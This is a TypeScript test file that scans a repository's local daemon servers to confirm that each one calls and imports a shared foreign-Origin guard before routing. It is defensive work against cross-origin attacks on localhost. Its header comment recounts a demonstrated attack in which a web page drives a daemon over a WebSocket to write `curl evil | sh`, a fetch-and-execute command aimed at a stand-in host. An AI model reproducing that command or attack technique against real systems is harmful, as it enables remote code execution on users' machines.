// EVERY DAEMON REFUSES A FOREIGN ORIGIN — the ninth-copy ward.
//
// ⛔ WHY A WARD AND NOT JUST NINE EDITS. The backend convergence's premise,
// written into `daemon-lifecycle-ward.test.ts`, is that "a fix costs six edits
// and reliably gets one to four of them". This fix costs NINE, and it is the
// one where a missed copy is not an inconvenience: a spell daemon that skips it
// can be driven by any web page the human visits. Scriptorium demonstrated the
// payload (a foreign page opening a WebSocket to `127.0.0.1` and driving
// `open` + `save` to write `curl evil | sh` outside the session, 2026-09-11)
// and closed its own hole; the other eight stayed open for three days, which is
// exactly the shape this repo keeps paying for.
//
// ⛔ AND IT IS A TEXT SCAN, WHICH IS THE WEAKER INSTRUMENT — SAID PLAINLY.
// The strong version spawns all nine daemons and sends a real foreign-Origin
// request. Only four spells own a spawn harness (glamour, imago, magpie,
// scriptorium), and building one for astrolabe, bounty, digestify, grapevine
// and mind-mapper — five different `open` verbs, five different argument
// shapes — is a bigger job than the fix it would guard, at the release this
// landed in. So the split is deliberate:
//
//   - the PURE function is proven exhaustively   → `src/kit/wire/origin.test.ts`
//   - the WIRE behaviour is proven where a harness exists (4 spells)
//   - the REMAINING FIVE are held by the scan below
//
// ⚠ THIS FILE IS A STOPGAP AND SHOULD SHRINK, NOT GROW. Each spell that gains
// a spawn harness should take its clause OUT of here and assert the 403 over a
// real socket instead. It is deliberately NOT a fourth clause on
// `daemon-lifecycle-ward`, whose own header forbids growing it ("adding a
// fourth clause here is a signal to go do that instead").
//
// ⛔ AND IT STRIPS COMMENTS FIRST, BECAUSE THAT DEFECT IS ON RECORD TWICE.
// `fix/wards-that-pass-on-prose` landed for a clause a COMMENT could satisfy,
// and `src/scriptorium/sinks.test.ts` hit the same trap a second time — this
// file's own header names `refuseForeignOrigin` several times and would satisfy
// an unstripped scan of itself. Third sighting; the helper stays local because
// sharing it means editing three wards, which is not this change's job.
import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { dirname, join, relative, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { Glob } from "bun";

const REPO_ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const SRC = join(REPO_ROOT, "src");

/** Comments removed, so prose can never satisfy a clause below. */
function code(text: string): string {
  return text.replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
}

/**
 * Every file in the tree that binds a port.
 *
 * ⚠ DERIVED FROM `Bun.serve`, NOT FROM A LIST OF SPELL NAMES. A tenth spell, or
 * a second server inside an existing spell, is caught by arriving — which is
 * the property a hand-kept roster cannot have. (`grimoire/roster-drift.test.ts`
 * records what a hand-kept count costs: it went stale four times.)
 */
export function serverFiles(): string[] {
  const out: string[] = [];
  for (const rel of new Glob("*/backend/**/*.ts").scanSync(SRC)) {
    if (/\.test\.ts$/.test(rel)) continue;
    const abs = join(SRC, rel);
    if (code(readFileSync(abs, "utf8")).includes("Bun.serve")) out.push(abs);
  }
  return out.sort();
}

describe("every daemon refuses a foreign origin", () => {
  const files = serverFiles();
  const show = (f: string) => relative(REPO_ROOT, f);

  test("the sweep ran (zero-guard: no servers and no violations look alike)", () => {
    // Nine at the time of writing: eight conjuration daemons plus digestify's
    // one-shot review server. A number below this means the glob broke, and a
    // silently empty population would make every clause below pass.
    expect(files.length).toBeGreaterThanOrEqual(9);
  });

  test("⛔ EVERY SERVER CALLS THE SHARED GUARD", () => {
    const missing = files
      .filter((f) => !code(readFileSync(f, "utf8")).includes("refuseForeignOrigin"))
      .map(show);
    expect(missing).toEqual([]);
  });

  test("⛔ AND IMPORTS IT FROM THE KIT RATHER THAN KEEPING A COPY", () => {
    // A local re-implementation is how the fifth copy of the error taxonomy
    // happened (register item, filed not fixed). One definition, or the next
    // widening reaches eight of nine again.
    const local = files
      .filter((f) => {
        const c = code(readFileSync(f, "utf8"));
        return !/from\s+["'][^"']*kit\/wire\/origin\.ts["']/.test(c);
      })
      .map(show);
    expect(local).toEqual([]);
  });

  test("⚠ NO SERVER KEEPS ITS OWN `sameOrigin` — the copy this fix replaced", () => {
    // Scriptorium's original lived in its own `server.ts`. If that definition
    // comes back anywhere, the kit's version is no longer the only one.
    const redefined = files
      .filter((f) => /function\s+sameOrigin\b/.test(code(readFileSync(f, "utf8"))))
      .map(show);
    expect(redefined).toEqual([]);
  });

  test("⛔ THE GUARD RUNS BEFORE ANY ROUTING — measured by position, not by hope", () => {
    // A guard placed after a route has already answered is not a guard. The
    // cheapest honest proxy for "first": it precedes this file's first
    // `srv.upgrade` and its first `Response.json`, which is where a daemon
    // starts doing work. Only checked where both tokens exist.
    const late: string[] = [];
    for (const f of files) {
      const c = code(readFileSync(f, "utf8"));
      const guard = c.indexOf("refuseForeignOrigin(");
      if (guard === -1) continue; // the clause above owns this failure
      for (const token of ["srv.upgrade(", "server.upgrade("]) {
        const work = c.indexOf(token);
        if (work !== -1 && work < guard) late.push(`${show(f)} — ${token} precedes the guard`);
      }
    }
    expect(late).toEqual([]);
  });
});
